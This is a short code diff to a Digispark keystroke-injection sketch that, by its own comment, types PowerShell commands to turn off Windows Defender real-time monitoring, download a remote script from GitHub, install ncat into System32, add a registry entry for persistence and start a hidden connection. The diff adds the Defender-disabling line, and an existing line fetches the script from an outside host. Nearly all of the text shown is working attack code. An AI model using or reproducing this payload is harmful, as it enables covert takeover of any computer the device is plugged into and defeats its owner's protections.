@@ -64,6 +64,7 @@ void setup() {
     DigiKeyboard.delay(1000);
 
 // DOWNLOADS POWERSHELL SCRIPT TO: DISABLE DEFENDER MONITORING, DOWNLOAD NCAT, EXPORT NCAT, MOVE NC.EXE TO SYS32, ADD REGISTRY TO RESTART CONNECTION ON RESTARTING PC, AND STARTING CONNECTION WHILE HIDING WINDOWS/PROCESS.
+    DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
     DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/bjrumplee/final/main/final.ps1') | Set-Content -Path 'C:\\TEMP\\final.ps1'");
     DigiKeyboard.delay(100); // DELAY 100
     DigiKeyboard.sendKeyStroke(40, 0); // ENTER
